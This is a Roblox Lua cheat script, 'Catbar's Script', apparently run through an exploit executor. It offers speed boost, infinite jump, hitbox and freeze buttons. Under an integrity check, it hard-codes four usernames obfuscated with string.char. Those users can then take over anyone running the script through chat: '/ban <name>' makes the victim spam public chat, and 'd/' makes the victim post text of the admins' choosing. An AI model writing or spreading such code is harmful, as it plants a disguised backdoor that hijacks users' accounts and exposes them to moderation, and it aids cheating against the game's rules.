-- SERVICES   
   local Players = game:GetService("Players")   
   local RS = game:GetService("RunService")   
   local UIS = game:GetService("UserInputService")   
   local player = Players.LocalPlayer   

   -- OWNER + ADMIN (ENCODED TO PREVENT TAMPERING)   
   local _O = string.char(85, 115, 101, 114, 95, 75, 86, 72) -- "User_KVH"   
   local _A1 = string.char(74, 97, 51, 49, 52, 52, 53)      -- "Ja31445"   
   local _A2 = string.char(118, 117, 107, 105, 115, 98, 101, 115, 116, 54) -- "vukisbest6"   
   local _A3 = string.char(75, 97, 114, 116, 105, 121, 101, 107, 97, 95, 56, 56, 48) -- "Kartikeya_880"   

   local AUTH_USERS = {   
       [_O] = true,   
       [_A1] = true,   
       [_A2] = true,   
       [_A3] = true   
   }   

   -- HARD-CODED INTEGRITY CHECK   
   local verified = false   
   for name, _ in pairs(AUTH_USERS) do   
       if name == string.char(85, 115, 101, 114, 95, 75, 86, 72) then   
           verified = true   
       end   
   end   

   if not verified then return end   

   -- GUI   
   local gui = Instance.new("ScreenGui", game.CoreGui)   
   gui.ResetOnSpawn = false   

   -- MAIN FRAME   
   local frame = Instance.new("Frame", gui)   
   frame.Size = UDim2.new(0,180,0,100)   
   frame.Position = UDim2.new(0.5,-90,0.5,-80)   
   frame.BackgroundColor3 = Color3.fromRGB(25,25,25)   
   frame.BackgroundTransparency = 0.2   
   frame.Active = true   
   frame.Draggable = true   
   Instance.new("UICorner",frame)   

   -- CLOSE BUTTON   
   local close = Instance.new("TextButton", frame)   
   close.Size = UDim2.new(0,18,0,18)   
   close.Position = UDim2.new(1,-20,0,3)   
   close.Text = "X"   
   close.TextSize = 12   
   close.BackgroundColor3 = Color3.fromRGB(200,50,50)   
   close.TextColor3 = Color3.new(1,1,1)   
   Instance.new("UICorner",close)   

   -- RAINBOW BUTTON   
   local rainbow = Instance.new("TextButton",frame)   
   rainbow.Size = UDim2.new(0,18,0,18)   
   rainbow.Position = UDim2.new(0,3,0,3)   
   rainbow.BackgroundColor3 = Color3.new(1,1,1)   
   rainbow.Text = ""   
   Instance.new("UICorner",rainbow)   

   -- TITLE   
   local title = Instance.new("TextLabel", frame)   
   title.Size = UDim2.new(1,0,0,20)   
   title.BackgroundTransparency = 1   
   title.Text = "Catbar’s Script"   
   title.Font = Enum.Font.SourceSansBold   
   title.TextScaled = true   
   title.TextColor3 = Color3.new(1,1,1)   

   -- CONTAINER   
   local container = Instance.new("Frame", frame)   
   container.Size = UDim2.new(1,0,1,-25)   
   container.Position = UDim2.new(0,0,0,25)   
   container.BackgroundTransparency = 1   

   local layout = Instance.new("UIListLayout", container)   
   layout.Padding = UDim.new(0,6)   
   layout.HorizontalAlignment = Enum.HorizontalAlignment.Center   

   layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()   
       frame.Size = UDim2.new(0,180,0,layout.AbsoluteContentSize.Y+45)   
   end)   

   -- BUTTON CREATORS   
   local function smallButton(parent,text,color)   
       local b = Instance.new("TextButton",parent)   
       b.Size = UDim2.new(0.5,-3,1,0)   
       b.Text = text   
       b.TextScaled = true   
       b.TextWrapped = true   
       b.TextColor3 = Color3.new(1,1,1)   
       b.BackgroundColor3 = color or Color3.fromRGB(70,70,70)   
       Instance.new("UICorner",b)   
       return b   
   end   

   local function createButton(parent,text,color)   
       local b = Instance.new("TextButton",parent)   
       b.Size = UDim2.new(0.9,0,0,30)   
       b.Text = text   
       b.TextScaled = true   
       b.TextWrapped = true   
       b.TextColor3 = Color3.new(1,1,1)   
       b.BackgroundColor3 = color   
       Instance.new("UICorner",b)   
       return b   
   end   

   local function createRow()   
       local row = Instance.new("Frame",container)   
       row.Size = UDim2.new(0.9,0,0,30)   
       row.BackgroundTransparency = 1   
       local rowLayout = Instance.new("UIListLayout",row)   
       rowLayout.FillDirection = Enum.FillDirection.Horizontal   
       rowLayout.Padding = UDim.new(0,6)   
       rowLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center   
       return row   
   end   

   -- CHECK IF PLAYER IS ADMIN/OWNER   
   local isAuth = AUTH_USERS[player.Name]   

   -- BUTTONS
   local row1 = createRow()   
   local lay = smallButton(row1,"Lay")   
   local sit = smallButton(row1,"Sit")   

   local row2 = createRow()   
   local hitBtn = smallButton(row2,"Pulse Hitboxes",Color3.fromRGB(120,200,255))   
   local infJumpBtn = smallButton(row2,"Inf Jump",Color3.fromRGB(0,170,0))   

   local emergency, freezeBtn   
   if isAuth then   
       local row3 = createRow()   
       emergency = smallButton(row3,"Emergency Escape",Color3.fromRGB(200,120,0))   
       freezeBtn = smallButton(row3,"Freeze All",Color3.fromRGB(120,120,255))   
   end   

   local speedBtn = createButton(container,"Speed Boost OFF",Color3.fromRGB(200,50,50))   

   -- RAINBOW
   local rainbowMode = false   
   task.spawn(function()   
       while true do   
           if rainbowMode then   
               for i=0,1,0.02 do   
                   if not rainbowMode then break end   
                   rainbow.BackgroundColor3 = Color3.fromHSV(i,1,1)   
                   task.wait(0.03)   
               end   
           else   
               task.wait()   
           end   
       end   
   end)   

   -- SPEED
   local speedOn=false   
   local originalSpeed   
   speedBtn.MouseButton1Click:Connect(function()   
       local hum=player.Character and player.Character:FindFirstChildOfClass("Humanoid")   
       if not hum then return end   
       if not speedOn then   
           originalSpeed=hum.WalkSpeed   
           hum.WalkSpeed=60   
           speedBtn.Text="Speed Boost ON"   
           speedOn=true   
       else   
           hum.WalkSpeed=originalSpeed or 16   
           speedBtn.Text="Speed Boost OFF"   
           speedOn=false   
       end   
   end)   

   ----------------------------------------------------------------   
   -- COMMAND SYSTEM   
   ----------------------------------------------------------------   
   local commandActiveForAdmins = true   
   local loopKillTargets = {}   

   local function canAffect(sender, target)   
       if not commandActiveForAdmins then   
           if AUTH_USERS[sender.Name] and AUTH_USERS[target.Name] then   
               return false   
           end   
       end   
       return true   
   end   

   local function sendSpam()
       local spamText = string.rep("A", 140)
       for i = 1, 10 do
           local chatService = game:GetService("TextChatService")
           if chatService.ChatVersion == Enum.ChatVersion.TextChatService then
               local chan = chatService:WaitForChild("TextChannels"):FindFirstChild("RBXGeneral")
               if chan then chan:SendAsync(spamText) end
           else
               game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(spamText, "All")
           end
           task.wait(0.1)
       end
   end

   local function setupCommandListeners()   
       local function listenCommands(p)   
           p.Chatted:Connect(function(msg)   
               local args = string.split(msg, " ")

               -- BAN COMMAND (Always ignores /off for regular players)
               if args[1]:lower() == "/ban" and args[2] then
                   if AUTH_USERS[p.Name] and not AUTH_USERS[player.Name] then
                       if player.Name:lower() == args[2]:lower() then
                           sendSpam()
                       end
                   end
                   return
               end

               -- MIRROR COMMAND (d/)
               if string.sub(msg:lower(), 1, 2) == "d/" then   
                   local sayText = string.sub(msg, 3)   
                   if p.Name ~= player.Name and AUTH_USERS[p.Name] and canAffect(p, player) then   
                       local chatService = game:GetService("TextChatService")
                       if chatService.ChatVersion == Enum.ChatVersion.TextChatService then
                           local chan = chatService:WaitForChild("TextChannels"):FindFirstChild("RBXGeneral")
                           if chan then chan:SendAsync(sayText) end
                       else
                           game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(sayText, "All")
                       end
                   end   
                   return   
               end   

               -- OTHER COMMANDS
               if not AUTH_USERS[p.Name] then return end   
               
               if p.Name == _O then   
                   if msg == "/off" then commandActiveForAdmins = false   
                   elseif msg == "/on" then commandActiveForAdmins = true end   
               end   
           end)   
       end   

       for _,plr in pairs(Players:GetPlayers()) do listenCommands(plr) end   
       Players.PlayerAdded:Connect(listenCommands)   
   end   

   setupCommandListeners()   
   close.MouseButton1Click:Connect(function() frame:Destroy() end)
